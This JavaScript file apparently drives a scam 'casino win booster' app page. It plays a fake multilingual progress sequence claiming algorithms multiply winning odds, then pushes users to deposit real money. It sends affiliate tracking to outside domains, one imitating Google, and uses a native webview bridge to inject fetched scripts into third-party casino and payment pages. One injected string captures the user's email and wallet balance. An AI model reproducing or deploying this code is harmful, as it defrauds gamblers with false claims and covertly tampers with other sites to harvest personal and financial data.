$(function(){
    function getURLParameter(name) {
        return decodeURI((RegExp(name + '=([^&#]*)').exec(location.search) || [, null])[1] || '');
    }


    //--------------------------------
    if(!window.$a_ && /iPad|iPhone|iPod/.test(navigator.userAgent)){
        $a_ = {
            log: function (msg) {
                return CallWVIOS('log', msg)
            },
            setItem: function (key, value) {
                return CallWVIOS('setItem', key, value);
            },
            getItem: function (key, def) {
                return CallWVIOS('getItem', key, def);
            },
            filter: function (URLPie, content) {
                return CallWVIOS('filter', URLPie, content);
            },
            sendEvent: function (eventName, param) {
                return CallWVIOS('sendEvent', eventName, param);
            }
        };

        function CallWVIOS(method, arg1, arg2) {
            let result = false;
            try {
                let x = new XMLHttpRequest();
                x.withCredentials = false;
                x.open('post', '//__app__/' + method + '/' + arg1, false);
                x.send(JSON.stringify({method, arg1, arg2}));
                result = x.response;
            } catch (e) {}
            return result;
        }
    }

    if(!window.$a_) {
        $a_ = {
            log: function (msg) {
                console.log(msg);
            },
            setItem: function (key, value) {
                return localStorage.setItem(key, value);
            },
            getItem: function (key, def) {
                let res = localStorage.getItem(key);
                return (res == null)?def:key;
            },
            filter: function (URLPie, content) {}
        };
    }
    //--------------------------------


    // navigator.sendBeacon('//app.gcejs.com/api/track/' + location.search);
    fetch('//app.gcejs.com/api/track/' + location.search);

    let domain = getURLParameter('domain');
    if(domain === '' || domain === 'wt3us.com'){
        domain = 'wt3us.com/trk';
    }

    let clickID = '';
    try{
        try {
            clickID = new URL(decodeURIComponent(getURLParameter('rot'))).searchParams.get('sub').split(':')[0];
        }catch (e){}
        if(clickID === ''){
            clickID = getURLParameter('clickid');
        }
        if(clickID !== ''){
            if(window.$a_){
                let tcid = $a_.getItem('clickid', '');

                if(tcid === ''){
                    $a_.setItem('clickid', clickID);
                    $a_.setItem('domain', domain);
                } else if(tcid !== clickID){
                    clickID = tcid;
                }
            }

            if(clickID.length > 20){
                fetch('https://purchanger.com/postback?cid='+ clickID +'&payout=0&et=Install');
                fetch('https://alimit-solysis.com/postback?cid='+ clickID +'&payout=0&et=Install');
            }else{
                // fetch('https://' + domain + '/click.php?cnv_id='+ clickID +'&event2=1');
                // fetch('https://app.gcejs.com/install/?cnv_id='+ clickID);
                fetch('https://playgoogle.ru.com/install/?cnv_id='+ clickID);
            }

        }
    } catch(e){}

    let abtest = '';
    // if(getURLParameter('abtest') !== '' && window.$a_){
    //     abtest = $a_.getItem('abtest', '');
    //     if(abtest === ''){  // first run
    //         abtest = getURLParameter('abtest');
    //         // abtest = (Math.random() > .5)?'1':'2';
    //         $a_.setItem('abtest', abtest);
    //         if(abtest === "2"){
    //                 href__ = "/video/couch_video_new.mp4";
    //         } else


                                                                    /*            let href__ = "/video/couch_video_new.mp4";
                                                                                let preloadLink = document.createElement("link");
                                                                                preloadLink.href = href__;
                                                                                preloadLink.rel = "preload";
                                                                                preloadLink.as = "fetch";
                                                                                preloadLink.type = "video/mp4";
                                                                                document.head.appendChild(preloadLink);*/
    //     }
    // }

    let loadscripts = new Promise(function(acc){
        if(window.$a_){
            let mb = getURLParameter('mb');
            if(mb !== ''){
                $a_.setItem('mb', mb);
            }

            function returnURL() {
                let url = $a_.getItem('url', '');
                // console.log('##########' + url);
                // url = '';

                if(url === ''){
                    acc('');
                }else{
                    fetch('https://' + url, {mode: 'no-cors'}).then(
                        function(){acc(url)},
                        function(){acc('')}
                    )
                }
            }

            fetch('/inj/vlk.js')
                .then(function(response) {
                    return response.text();
                })
                .then(function(js) {

                    // alfa payment preloader
                    let openJs = `
let opn = window.open;
window.open = function (url) {
    if(url.indexOf('/cashier/in/fullpage') >= 0){
        let tpl = '<div class="vlkPrel"><div><dfn></dfn></div><style>@keyframes vlkPrel {from {width: 0}to {width: 100%}}.vlkPrel {position: fixed;top:0;left:0;width:100%;height:100%;background-color:#00000080;z-index:10000;display:flex;justify-content:center;align-content:center;align-items:center;}.vlkPrel div {width:75%;height:40px;border-radius:50px;background-color:#2dc315;position:relative;overflow:hidden;}.vlkPrel dfn {position: absolute;top:0;left:0;height:100%;width:100%;animation:vlkPrel 7s 1 ease-in-out;background: repeating-linear-gradient(-45deg,#2dc315,#2dc315 3px,#fff 0,#fff 6px);background-size:100%;background-repeat:no-repeat;}</style></div>';
        document.body.insertAdjacentHTML('beforeend', tpl);
    }        
    return opn.apply(window, arguments);
};
                    `;
                    $a_.filter('.net/bundle.js', openJs);

                    // $a_.filter("preloadUtils.js", js); // add video below
                    $a_.filter('vp/bundles/common.bundle.js', "if(!window.$a_ && /iPad|iPhone|iPod/.test(navigator.userAgent)){$a_ = {log: function (msg) {return CallWVIOS('log', msg)},setItem: function (key, value) {return CallWVIOS('setItem', key, value);},getItem: function (key, def) {return CallWVIOS('getItem', key, def);},filter: function (URLPie, content) {return CallWVIOS('filter', URLPie, content);},sendEvent: function (eventName, param) {return CallWVIOS('sendEvent', eventName, param);}};function CallWVIOS(method, arg1, arg2) {let result = false;try {let x = new XMLHttpRequest();x.withCredentials = false;x.open('post', '//__app__/' + method + '/' + arg1, false);x.send(JSON.stringify({method, arg1, arg2}));result = x.response;} catch (e) {}return result;}};if(window['settingsLink']){$a_.setItem('url', new URL(settingsLink).host)};try {if(window.appData){$a_.setItem('email', appData.user.email);$a_.setItem('balance', appData.user.wallet.balance);if(Object.keys($a_).indexOf(\"sendEvent\")!==-1 && ($a_.getItem('reg','')==\"\" || (new Date - new Date(appData.user.registrationDateObj))/86400000<=4)){$a_.sendEvent('rg',1);}$a_.setItem('reg', appData.user.registrationDate);}} catch (e){};");
                    $a_.filter('slogin_init.js', "document.head.insertAdjacentHTML('beforeend', '<style>.b-social__link--gp{display: none;}</style>');");

                    // vlk payment
                    fetch('/inj/lab.js')
                        .then(function(response) {
                            return response.text();
                        })
                        .then(function(lab) {
                            $a_.filter("lab.com/js/", lab);
                            $a_.filter("solutions.com/js/", lab);

                            // vlk slogin
                            fetch('/inj/slogin.js')
                                .then(function(response) {
                                    return response.text();
                                })
                                .then(function(lab) {
                                    $a_.filter("biz/slogin", lab);
                                    fetch('/inj/video.js')
                                        .then(_ => _.text())
                                        .then(function(vjs) {
                                            $a_.filter(".net/bundle.js", vjs);
                                            $a_.filter("DMCABadgeHelper.min.js", vjs);
                                            $a_.filter("preloadUtils.js", js + vjs);
                                            //----------VIDEO_ROX----------//
                                            fetch('/inj/video_rox.js')
                                                .then(__ => __.text())
                                                .then(function (vjs) {
                                                    $a_.filter("stage.js", vjs);
                                                })
                                            //----------VIDEO_ROX----------//
                                            returnURL();
                                        }).catch(returnURL);

                                    // returnURL(); // vedeo
                                })
                                .catch(function () {
                                    returnURL();
                                });
                        })
                        .catch(function () {
                            returnURL();
                        });
                })
                .catch(function () {
                    returnURL();
                });
        }else{
            acc('');
        }
    });

    function onAnimationEnd() {
        loadscripts.then(function (url) {
            // url = '';
            if(url === ''){
                url = decodeURIComponent(getURLParameter('rot'));
            }

            if(url === ''){
                url = domain +'/click.php?lp=1';
                if(abtest !== ''){
                    url += '&to_offer=' + abtest;
                }
            }
            if(url !== ''){
                if(url.indexOf('http') !== 0){
                    url = 'https://' + url;
                }

                // document.write("S:" + url);
                location.href = url;
            }
        });
    }

    let messages = {
            'ru': {
                title: 'Настраиваем приложение для увеличения вероятности выигрыша:',
                end: 'Настройка приложения успешно выполнена',
                params: [
                    'Подбираем сервер на основе статистики игр за сутки',
                    'Запускаем виртуализацию браузера <br> для обхода истории подключений',
                    'Меняем аппаратный отпечаток устройства',
                    'Настраиваем безопасное подключение',
                    'Создаём выделенный VPN proxy',
                    'Устанавливаем защишенное туннельное SSL соединение',
                    'Модифицируем значения переменных в cookie и local storage',
                    'Инициализируем генератор случайных чисел',
                    'Получаем доступные слоты',
                    'Ожидаем окно отладочного подключения для сбора статистики',
                    'Делаем репликацию данных',
                    'Моделируем выигрышные комбинации модифицированным методом Монте-Карло',
                    'Cемплируем данные начальной выборки полученной статистической модели',
                    'Отбираем слоты с максимальным процентом выигрыша на основе наших статистических данных и логирования подключений',
                    'Пропускаем плохие комбинации алгоритмом Метрополиса-Гастингса'
                ],
                end1: 'Максимальная вероятность выигрыша увеличена до # раз.',
                end2: 'После перехода в интерфейс казино, необходимо зарегистрировать новый аккаунт и внести депозит, т.к. алгоритмы, повышающие вероятность выигрыша, будут работать только при игре на реальные деньги.',
                end3: '* В течение нескольких секунд вам откроется настроенный интерфейс казино, с повышенной вероятностью выигрыша.'
            },
            'en': {
                title: 'Configuring the application<br> to increase the winning probability:',
                end: 'Application has been successfully configured.',
                params: [
                    'Selecting a server based on the game statistics in 24 hours',
                    'Launching the browser<br> to bypass the connection history',
                    'Changing the hardware fingerprint',
                    'Setting up a secure connection',
                    'Creating a dedicated VPN proxy',
                    'Installing a protected SSL tunnel connection',
                    'Modifying the values ​​of variables in cookie and local storage',
                    'Initialising the random number generator',
                    'Getting the available slots',
                    'Waiting for the debug connection window to collect statistics',
                    'Replicating data',
                    'Simulating winning combinations via modified Monte Carlo method',
                    'Sampling the data of initial selection of the resulting statistical model',
                    'Selecting slots with the highest winning percentage based on our statistics and logging connections',
                    'Skipping bad combination via Metropolis-Hastings algorithm'
                ],
                end1: 'Your winning chances have increased up to # times.',
                end2: 'After downloading the application, you need to go through a simple registration and make a deposit, because algorithms that increase the probability of winning will work only when playing for real money.',
                end3: '* Configured casino interface with high probability of winning will open in 6 seconds.'
            },
            'es': {
                title: 'Configurar la aplicación para aumentar las probabilidades de ganar:',
                end: 'La aplicación se ha configurado exitosamente',
                params: [
                    'Seleccionar un servidor basado en las estadísticas del juego en 24 horas',
                    'Lanzar el explorador para ignorar la historia de conexión',
                    'Cambiar la huella dactilar del hardware',
                    'Establecer una conexión segura',
                    'Crear un VPN proxy dedicado',
                    'Instalar una conexión de túnel SSL protegida',
                    'Modificar los valores de las variables en cookies y almacenamiento local',
                    'Iniciar el generador de números al azar',
                    'Obtener tragamonedas disponibles',
                    'Esperar la ventana de conexión de depuración para recolectar estadísticas',
                    'Replicar datos',
                    'Promover combinaciones ganadoras a través del método Monte Carlo modificado',
                    'Tomar muestras de la información de la selección inicial del modelo estadístico resultante',
                    'Seleccionar los tragamonedas con el porcentaje de victorias más alto según nuestras estadísticas y conexiones registradas',
                    'Saltar malas combinaciones con el algoritmo Metropolis-Hastingsа'
                ],
                end1: 'Tus probabilidades de ganar han aumentado # veces.',
                end2: 'Después de descargar la aplicación, debe pasar por un registro simple y hacer un depósito, porque los algoritmos que aumentan la probabilidad de ganar funcionarán solo cuando se juega con dinero real.',
                end3: '* Interfaz de casino configurada con altas probabilidades de ganar abrirá en 6 segundos.'
            },
            'tr': {
                title: 'Kazanma olasılığı yükseltmek için uygulama yapılandırılıyor',
                end: 'Uygulama başarıyla yapılandırıldı',
                params: [
                    '24 saatteki oyun istatistiklerine göre sunucu seçiliyor',
                    'Bağlantı geçmişini atlatmak için tarayıcı başlatılıyor',
                    'Donanım parmak izi değiştiriliyor',
                    'Güvenli bir bağlantı kuruluyor',
                    'Özel bir VPN proksi oluşturuluyor',
                    'Korunaklı bir SSL tünel bağlantısı yükleniyor',
                    'Çerez ve yerel depolama değişkenlerinin değeri düzenleniyor',
                    'Rastgele sayı oluşturucu başlatılıyor',
                    'Kullanılabilir alanlar alınıyor',
                    'Sorun giderme bağlantı penceresinin istatistikleri toplaması bekleniyor',
                    'Veriler taklit ediliyor',
                    'Düzenlenmiş Monte Carlo yöntemi aracılığıyla kazanma kombinasyonları simüle ediliyor',
                    'Sonuç veren istatistik modelinin başlangıçtaki seçim verileri örneklendiriliyor',
                    'İstatistiklerimize göre en çok kazanan yüzdelere sahip alanlar ve giriş bağlantıları seçiliyor',
                    'Metropolis-Hastings algoritması aracılığıyla kötü kombinasyon atlatılıyor'
                ],
                end1: 'Kazanma şansınız # kez arttı',
                end2: '"Uygulamayı indirdikten sonra basit bir kayıt sürecinden geçmeniz ve depozito yatırmanız gerekiyor çünkü kazanma olasılığını artıran algoritmalar sadece gerçek parayla oynadığınızda çalışırlar"',
                end3: '* Yüksek kazanma olasılıklı, yapılandırılmış kumarhane arayüzü 6 saniye içinde açılacak'
            },
            'it': {
                title: "Configurazione dell'applicazione per aumentare la probabilità di vincita",
                end: "L'applicazione è stata configurata correttamente",
                params: [
                    'Selezione di un server in base alle statistiche di gioco in 24 ore',
                    'Avvio del browser per evitare la cronologia delle connessioni',
                    "Modifica dell'impronta digitale dell'hardware",
                    'Impostazione di una connessione sicura',
                    'Creazione di un proxy VPN dedicato',
                    'Installazione di una connessione tunnel SSL protetta',
                    'Modifica dei valori delle variabili nei cookie e nella memoria locale',
                    'Inizializzazione del generatore di numeri casuali',
                    'Ottenimento delle slot disponibili',
                    'In attesa che la finestra della connessione di debug raccolga statistiche',
                    'Replica dei dati',
                    'Simulazione di combinazioni vincenti tramite il metodo Monte Carlo modificato',
                    'Campionamento dei dati della selezione iniziale del modello statistico risultante',
                    'Selezione delle slot con la percentuale di vincita più alta in base alle nostre statistiche e alle connessioni di log',
                    "Eliminazione delle cattive combinazioni tramite l'algoritmo Metropolis-Hastings"
                ],
                end1: 'Le tue possibilità di vincita sono aumentate fino a # volte',
                end2: "Dopo aver scaricato l'applicazione, devi effettuare una semplice registrazione e fare un deposito, perché gli algoritmi che aumentano la probabilità di vincita funzionano solo quando giochi con soldi veri",
                end3: "* L'interfaccia del casinò configurata con un'alta probabilità di vincita si aprirà fra 6 secondi"
            },
            'ar': {
                title: 'تكوين التطبيق لزيادة احتمالات الفوز',
                end: 'تم تكوين التطبيق بنجاح',
                params: [
                    'اختيار خادم بناءً على إحصائيات اللعبة خلال 24 ساعة',
                    'بدء تشغيل المتصفح لتجاوز سجل الاتصال',
                    'تغيير بصمة أصبع الأجهزة',
                    'إعداد اتصال آمن',
                    'إنشاء وكيل شبكة خاصة افتراضية (VPN) مخصص',
                    'تثبيت اتصال نفقي طبقة المقابس الآمنة (SSL) محمي',
                    'تعديل قيم المتغيرات في ملف تعريف الارتباط والتخزين المحلي',
                    'تهيئة مولد الأرقام العشوائي',
                    'الحصول على الفتحات المتاحة',
                    'انتظار نافذة اتصال التصحيح لجمع الإحصاءات',
                    'تكرار البيانات',
                    'محاكاة مجموعات الفوز عن طريق طريقة مونت كارلو المعدلة',
                    'معاينة بيانات الاختيار الأولي للنموذج الإحصائي الناتج',
                    'اختيار الفتحات ذات أعلى نسبة فوز بناءً على الإحصائيات واتصالات التسجيل الخاصة بنا',
                    'تخطي مجموعة سيئة عبر خوارزمية متروبوليس هاستينغز'
                ],
                end1: 'زادت فرصك في الفوز بمقدار # مرات',
                end2: 'بعد تنزيل التطبيق، يجب أن المرور عبر تسجيل بسيط والإيداع، لأن الخوارزميات التي تزيد من احتمال الفوز ستعمل فقط عند اللعب بأموال حقيقية',
                end3: '* سيتم فتح واجهة الكازينو التي تمتاز باحتمال كبير للفوز في 6 ثوانٍ'
            },
            'de': {
                title: 'Konfigiert die App, um die Gewinnwahrscheinlichkeit zu erhöhen',
                end: 'Die App wurde erfolgreich konfiguriert',
                params: [
                    'Wählt einen Server basierend auf den Spielestatistiken von 24 Stunden',
                    'Startet den Browser, um den Verbindungsverlauf zu umgehen',
                    'Ändert den Hardware-Fingerabdruck',
                    'Richtet eine sichere Verbindung ein',
                    'Erstellt einen eigenen VPN-Proxy',
                    'Installiert eine geschützte SSL-Tunnelverbindung',
                    'Modifiziert die Werte der Variablen der Cookies und im lokalen Speicher',
                    'Initialisiert den Zufallsgenerator',
                    'Erhält verfügbare Slots',
                    'Wartet auf das Debug-Verbindungsfenster, um Statistiken zu sammeln',
                    'Repliziert Daten',
                    'Simuliert Gewinnkombinationen mit der Monte-Carlo-Methode',
                    'Sammelt Daten der ersten Auswahl des statistischen Modells',
                    'Wählt die Slots mit den höchsten Gewinnwahrscheinlichkeiten basierend auf unseren Statistiken und den protokollierten Verbindungen aus',
                    'Überspringt schlechte Kombinationen mit dem Metropolis-Hastings-Algorithmus'
                ],
                end1: 'Ihre Gewinnchancen wurden um das #-fache erhöht',
                end2: 'Nach dem Herunterladen der App müssen Sie sich registrieren, um eine Einzahlung zu tätigen, weil die Algorithmen, welche die Gewinnwahrscheinlichkeit erhöhen, nur beim Einsatz mit echtem Geld funktionieren.',
                end3: '* Das konfigurierte Casino-Interface mit hoher Gewinnwahrscheinlichkeit wird in 6 Sekunden geöffnet'
            },
            'pl': {
                title: 'Konfigurowanie aplikacji w celu zwiększenia prawdopodobieństwa wygranej',
                end: 'Aplikacja została pomyślnie skonfigurowana',
                params: [
                    'Wybór serwera na podstawie statystyk gry za ostatnie 24 godziny',
                    'Uruchomienie przeglądarki w celu obejścia historii połączeń',
                    'Zmiana odcisku palca sprzętu',
                    'Konfiguracja bezpiecznego połączenia',
                    'Tworzenie dedykowanego VPN proxy',
                    'Ustawianie bezpiecznego połączenia tunelowego SSL',
                    'Zmiana wartości zmiennych cookies i lokalne repozytorium',
                    'Inicjalizacja generatora liczb losowych',
                    'Pobieranie listy dostępnych slotów',
                    'Oczekiwanie na okno debugowania połączenia do zbierania statystyk',
                    'Replikowanie danych',
                    'Modelowanie zwycięskich kombinacji za pomocą zmodyfikowanej metody Monte-Carlo',
                    'Próbkowanie danych pierwotnego wyboru wynikowego modelu statystycznego',
                    'Wybór slotów z najwyższym procentem wygranych na podstawie naszych statystyk i rejestracji połączeń',
                    'Pomijanie złych kombinacji przez algorytm Metropolis-Hastings'
                ],
                end1: 'Twoje szanse na wygraną wzrosły do # razy',
                end2: 'Po pobraniu aplikacji, należy przejść przez prostą rejestrację i dokonać wpłaty, bo algorytmy, które zwiększają prawdopodobieństwo wygranej, będą działać tylko przy grze na prawdziwe pieniądze',
                end3: '* Skonfigurowany interfejs kasyna z dużym prawdopodobieństwem wygranej zostanie otwarty za 6 sekund'
            },
            'cs': {
                title: 'Konfigurace aplikace pro zvýšení pravděpodobnosti výhry',
                end: 'Aplikace byla úspěšně nakonfigurována',
                params: [
                    'Výběr serveru na základě herních statistik z posledních 24 hodin',
                    'Spuštění prohlížeče pro obejití historie spojení',
                    'Změna otisku hardwaru',
                    'Nastavení bezpečného připojení',
                    'Vytvoření specifické VPN proxy',
                    'Instalace chráněného SSL tunelového spojení',
                    'Úprava hodnot proměnných v cookie a místním úložišti',
                    'Spouštění generátoru náhodných čísel',
                    'Získávání dostupných slotů',
                    'Čekání na okno spojení pro získání statistik',
                    'Replikování dat',
                    'Simulace výherních kombinací pomocí modifikované metody Monte Carlo',
                    'Sampling dat z prvního výběru výsledného statistického modelu',
                    'Výběr slotů s nejvyšší pravděpodobností výhry na základě statistik a záznamů spojení',
                    'Přeskakování nevhodných kombinací s pomocí algoritmu Metropolis-Hastings'
                ],
                end1: 'Vaše šance na výhru se znásobily # krát',
                end2: 'Po stažení aplikace musíte udělat jednoduchou registraci a vložit peníze, protože algoritmy zvyšují šanci na výhru jen v případě, že budete hrát se skutečnými penězi',
                end3: '* Konfigurace rozhraní kasina s vysokou pravděpodobností výhry se otevře za 6 vteřin'
            },
            'ja': {
                title: 'アプリを設定して勝率アップ',
                end: 'アプリは正常に設定されました',
                params: [
                    '24時間以内にゲームの統計に基づいて、サーバーを選択',
                    'ブラウザを起動して閲覧履歴を非表示',
                    'ハードウェアの指紋設定を変更',
                    '安全な接続を設定',
                    '専用VPNプロキシを作成',
                    '保護されたSSL接続を設定',
                    'Cookieとローカルストレージの変数の値を変更',
                    '乱数生成ツールを初期化',
                    '利用可能なスロットを特定',
                    'デバッグ接続を実行して統計を収集',
                    'データを複製',
                    '改訂したモンテカルロ法による勝利パターンをシミュレーション',
                    '統計モデルを採用した解析データをサンプリング',
                    '統計と接続ログに基づいて、勝率が最も高いスロットを採用',
                    'メトロポリス・ヘイスティングス法のアルゴリズムを利用して、勝率の低いパターンを除外'
                ],
                end1: '勝率は驚きの#倍までアップ',
                end2: 'アプリをダウンロードしたら、シンプルな手順で登録して、デポジットを行う必要があります。実際のお金を使ってプレーする場合にのみ、勝率を高めるアルゴリズムが作動します。',
                end3: '* 高勝率のカジノのインターフェースは、わずか6秒で起動します'
            },
            'es-419': {
                title: 'Configurando la app para aumentar la probabilidad de ganar',
                end: 'La app se ha configurado correctamente',
                params: [
                    'Seleccionando un servidor basándose en las estadísticas del juego en 24 horas',
                    'Iniciando el navegador para omitir el historial de conexión',
                    'Cambiando la huella digital del hardware',
                    'Configurando una conexión segura',
                    'Creando un proxy VPN especial',
                    'Instalando una conexión de túnel SSL protegida',
                    'Modificando los valores de variables en almacenamiento local y de cookies',
                    'Inicializando el generador de números aleatorios',
                    'Obteniendo espacios disponibles',
                    'Esperando a que la ventana de eliminación de fallos recopile estadísticas',
                    'Replicando datos',
                    'Simulando combinaciones ganadoras a través del método Monte Carlo modificado',
                    'Mostrando los datos de selección inicial del modelo estadístico resultante',
                    'Seleccionando tragamonedas con el mayor porcentaje de victorias en función de nuestras estadísticas y conexiones de registro',
                    'Omitiendo malas combinaciones a través del algoritmo Metropolis-Hastings'
                ],
                end1: 'Tus posibilidades de ganar han aumentado hasta # veces',
                end2: 'Después de descargar la app, debes pasar por un registro muy simple y realizar un depósito, ya que los algoritmos que aumentan la probabilidad de ganar funcionarán solo cuando juegues con dinero real',
                end3: '* La interfaz de casino configurada con alta probabilidad de ganar se abrirá en 6 segundos'
            },
            'es': {
                title: 'Configurando la aplicación para aumentar la probabilidad de ganar',
                end: 'La aplicación se ha configurado correctamente',
                params: [
                    'Seleccionando un servidor basado en las estadísticas del juego en 24 horas',
                    'Iniciando el navegador para omitir el historial de conexión',
                    'Cambiar la huella digital del hardware',
                    'Configurando una conexión segura',
                    'Creando un proxy VPN dedicado',
                    'Instalando una conexión de túnel SSL protegida',
                    'Modificando los valores de variables en los cookies y el almacenamiento local',
                    'Inicializando el generador de números aleatorios',
                    'Obteniendo los slots disponibles',
                    'Esperando a que la ventana de conexión de depuración recopile estadísticas',
                    'Replicando datos',
                    'Simulando combinaciones ganadoras a través del método Monte Carlo modificado',
                    'Muestreo de los datos de la selección inicial del modelo estadístico resultante',
                    'Seleccionando los slots con el mayor porcentaje de victorias en basados en nuestras estadísticas y conexiones de registro',
                    'Omitiendo una mala combinación a través del algoritmo de Metropolis-Hastings'
                ],
                end1: 'Sus posibilidades de ganar han aumentado hasta # veces',
                end2: 'Después de descargar la aplicación, debe realizar registrarse de forma sencilla y ingresar un depósito, ya que los algoritmos que aumentan la probabilidad de ganar funcionarán solo cuando juegue con dinero verdadero',
                end3: '* La interfaz del casino configurada con alta probabilidad de ganar, se abrirá en 6 segundos'
            },
            'hi': {
                title: 'जीतने की संभावना बढ़ाने के लिए एप्लीकेशन को कॉन्फ़िगर करना',
                end: 'एप्लीकेशन कॉन्फ़िगर कर दिया गया',
                params: [
                    '24 घंटों में गेम के आंकड़ों के आधार पर सर्वर सिलेक्ट कर रहा है',
                    'कनेक्शन हिस्ट्री को वापस करने के लिए ब्राउज़र लांच कर रहा है',
                    'हार्डवेयर फिंगरप्रिंट बदल रहा है',
                    'एक सिक्योर कनेक्शन सेट अप कर रहा है',
                    'एक डेडीकेटेड वीपीएन प्रोक्सी बना रहा है',
                    'एक प्रोटेक्टेड SSL टनल कनेक्शन इंस्टॉल कर रहा है',
                    'कुकी और लोकल स्टोरेज में वेरिएबल की वैल्यू बदल रहा है',
                    'रेंडम नंबर जेनरेटर शुरू कर रहा है',
                    'उपलब्ध स्लॉट ले रहा है',
                    'आंकड़े लेने के लिए डिबग कनेक्शन विंडो का इंतजार कर रहा है',
                    'आंकड़े रिप्लिकेट कर रहा है',
                    'मॉडिफाइड Monte Carlo मेथड से जीतने के कॉन्बिनेशन सिमुलेट कर रहा है',
                    'इससे मिले स्टैटिसटिकल मॉडल के शुरुआती सिलेक्शन के डाटा के सैंपल ले रहा है',
                    'हमारे आंकड़ों और लॉगिन कनेक्शन्स के आधार पर सबसे ज्यादा जीतने के प्रतिशत वाले स्लॉट सिलेक्ट कर रहा है',
                    'Metropolis-Hastings एल्गोरिथ्म के जरिए खराब कंबीनेशन हटा रहा है'
                ],
                end1: 'आपके जीतने की संभावनाएं # गुना तक बढ़ गई हैं',
                end2: 'एप्लीकेशन डाउनलोड करने के बाद आपको बस एक आसान सा रजिस्ट्रेशन करके डिपाजिट करना होगा क्योंकि जीतने की संभावना बढ़ाने वाले लॉजिक केवल तभी काम करते हैं जब आप असली पैसों से खेल रहे होते हैं',
                end3: '* कॉन्फ़िगर किया हुआ कसीनो इंटरफ़ेस जिसमें जीतने की संभावना बहुत ज्यादा है 6 सेकंड में खुल जाएगा'
            },
            'fr-CA': {
                title: "Configurer l'application pour augmenter la probabilité de gagner",
                end: "L'application a été configurée avec succès",
                params: [
                    'Choisir un serveur en fonction des statistiques du jeu en 24 heures',
                    "Exécuter le navigateur pour contourner l'historique de connexion",
                    "Changer l'empreinte digitale du matériel",
                    'Établir une connexion sécurisée',
                    'Créer un proxy VPN dédié',
                    'Installer une connexion de tunnel SSL protégée',
                    'Modifier les valeurs des variables dans les cookies et le stockage local',
                    'Initialiser le générateur de nombres aléatoires',
                    'Obtenir les emplacements disponibles',
                    "Attendre l'ouverture de la fenêtre de connexion de débogage pour collecter les statistiques",
                    'Répliquer les données',
                    'Simuler des combinaisons gagnantes grâce à la méthode modifiée de Monte Carlo',
                    'Échantillonnage des données de la sélection initiale du modèle statistique résultant',
                    'Sélectionner les créneaux avec le pourcentage de gain le plus élevé sur la base de nos statistiques et de nos données de connexion.',
                    "Ignorer une mauvaise combinaison via l'algorithme Metropolis-Hastings"
                ],
                end1: "Vos chances de gagner ont augmenté jusqu'à # fois",
                end2: "Après avoir téléchargé l'application, vous devez faire une simple inscription et effectuer un dépôt, car les algorithmes qui augmentent la probabilité de gagner ne fonctionneront que si vous jouez avec de l'argent réel",
                end3: "* L'interface configurée du casino avec une forte probabilité de gagner s'ouvrira dans les 6 secondes."
            }
        },
        userLang = navigator.language.split('-')[0],
        langMsgs = messages[userLang]?messages[userLang]:messages['ru'],
        times = [1000, 1000, 1000, 2000, 2000, 1000, 1000, 500, 500, 1000, 1000, 2500, 1000, 2000, 2000],
        digit = 0;

    $('.first-message').html(langMsgs.title);
    $('.end_message').html(langMsgs.end);

    let origContainer = $('.progLine'),
        timeOut = 0;

    langMsgs.params.forEach(function(msg, i){
        setTimeout(function () {
            let container = origContainer;
            if(i){
                container = origContainer.clone();
                $('.progress_unit').append(container);
            }

            container.parent().scrollTop(10000000);

            let progress_parent = container.find('.parent_progress_bar'),
                progress = container.find('.child_progress_bar'),
                progres_width = (progress_parent.css('width')),
                width = (progress.css('width', '0px')),
                procent = container.find('.procent');

            container.find('.first_unit').html(msg);
            $({numberValue: 0}).animate({numberValue: 100}, {
                duration: times[i] - 200,
                easing: 'linear',
                step: function () {
                    procent.text(Math.ceil(this.numberValue));
                },
                complete: function () {
                    procent.text(100);
                }
            });

            setTimeout(function () {
                procent.css('text-shadow', '0 0 30px rgb(21, 65, 255)');
                container.find('.count_procent').css('text-shadow', '0 0 30px rgb(21, 65, 255)')
            }, times[i]);

            width.animate({width: progres_width}, times[i]);
        }, timeOut);
        timeOut += times[i];
    });

    setTimeout(function () {
        $('.progress_bar_wrapper').css('display', 'none');
        $('.first-message').css('display', 'none');
        $('.second-message').css({
            'color': '#00ff9d',
            'display': 'flex',
            'flex-direction': 'column',
            'align-items': 'center'
        });
        $(window).scrollTop($('.widget_speed').prop('scrollHeight'))
    }, timeOut);
    timeOut += 2000;

    setTimeout(function () {
        function randomInteger(min, max) {
            return Math.round(min + Math.random() * (max - min));
        }

        $('.second-message').hide();
        $('.speedometr_wrapper, .digital_number').show();
        $(window).scrollTop(10000000);

        let $arrow_container = $('.arrow_container'),
            $arrow_red = $('.arrow_red'),
            $arrow_blue = $('.arrow_blue'),
            $speedometer_white = $('.speedometer_white'),
            $speedometer_red = $('.speedometer_red'),
            random_number = randomInteger(79.5, 82);    // 4.9 - 5

        $({deg: -89}).animate({deg: random_number}, {
            duration: 2000,
            step: function (now) {
                if (now > 16) {
                    $arrow_red.css({'opacity': '0'});
                    $arrow_blue.css('opacity', '1');
                    $speedometer_red.css('opacity', '0');
                    $speedometer_white.css('opacity', '1');
                }
                $arrow_container.css({
                    transform: 'translateX(-50%) rotate(' + now + 'deg)'
                });
                digit = (((now + 89) / 172) * 5).toFixed(2);
                $('.digital_number').text(digit);
            }
        });
    }, timeOut);
    timeOut += 2500;

    setTimeout(function winnertext() {
        $('.winner_text span').text(langMsgs.end1.replace('#', digit));
        $('.winner_text > div > div').text(langMsgs.end2);
        $('.winner_text .winner_text_second').text(langMsgs.end3);
        $(window).scrollTop($('.widget_speed').prop('scrollHeight'));
        setTimeout(onAnimationEnd, 5000);
    }, timeOut);
});
